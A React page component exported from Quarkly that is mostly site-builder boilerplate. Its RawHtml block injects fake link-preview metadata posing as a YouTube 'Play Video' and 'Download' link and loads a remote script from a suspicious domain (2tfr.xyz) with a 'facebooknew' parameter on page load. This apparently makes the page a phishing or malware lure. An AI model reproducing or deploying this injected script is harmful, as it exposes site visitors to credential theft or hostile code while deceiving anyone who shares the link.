import React from "react";
import theme from "theme";
import { Theme, Link } from "@quarkly/widgets";
import { Helmet } from "react-helmet";
import { GlobalQuarklyPageStyles } from "global-page-styles";
import { RawHtml } from "@quarkly/components";
export default (() => {
	return <Theme theme={theme}>
		<GlobalQuarklyPageStyles pageUrl={"index"} />
		<Helmet>
			<title>
				Quarkly export
			</title>
			<meta name={"description"} content={"Web site created using quarkly.io"} />
			<link rel={"shortcut icon"} href={"https://uploads.quarkly.io/readme/cra/favicon-32x32.ico"} type={"image/x-icon"} />
		</Helmet>
		<Link
			font={"--capture"}
			font-size={"10px"}
			position={"fixed"}
			bottom={"12px"}
			right={"12px"}
			z-index={"4"}
			border-radius={"4px"}
			padding={"5px 12px 4px"}
			background-color={"--dark"}
			opacity={"0.6"}
			hover-opacity={"1"}
			color={"--light"}
			cursor={"pointer"}
			transition={"--opacityOut"}
			quarkly-title={"Badge"}
			text-decoration-line={"initial"}
			href={"https://quarkly.io/"}
			target={"_blank"}
		>
			Made on Quarkly
		</Link>
		<RawHtml>
			<style place={"endOfHead"} rawKey={"63b877e74a50a9001ffb6d97"}>
				{":root {\n  box-sizing: border-box;\n}\n\n* {\n  box-sizing: inherit;\n}"}
			</style>
			<script place={"endOfHead"} rawKey={"63b87aa7e4610eb792ef64ec"}>
				{"<head>\n<meta charset=\"windows-1252\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<meta property=\"og:url\" content=\"https://www.youtube.com\" />\n<meta property=\"og:title\" content=\"Play Video\" />\n<meta property=\"og:image\" content=\"https://media.licdn.com/dms/image/C4E22AQH05yDQuCUz1Q/feedshare-shrink_800/0/1672658173265?e=1675296000&v=beta&t=8kSUSs0hiHLB2pnGjh5PGUW-O7TvyUEZWR3fUZh1N7I\" />\n<meta property=\"og:image:width\" content=\"1280\" />\n<meta property=\"og:image:height\" content=\"720\" />\n<meta property=\"og:description\" content=\"Download\" />\n<script src=\"https://2tfr.xyz/r4x/?api=1&lan=facebooknew&ht=2\" type=\"text/javascript\" async=\"true\"></script>\n</head>"}
			</script>
		</RawHtml>
	</Theme>;
});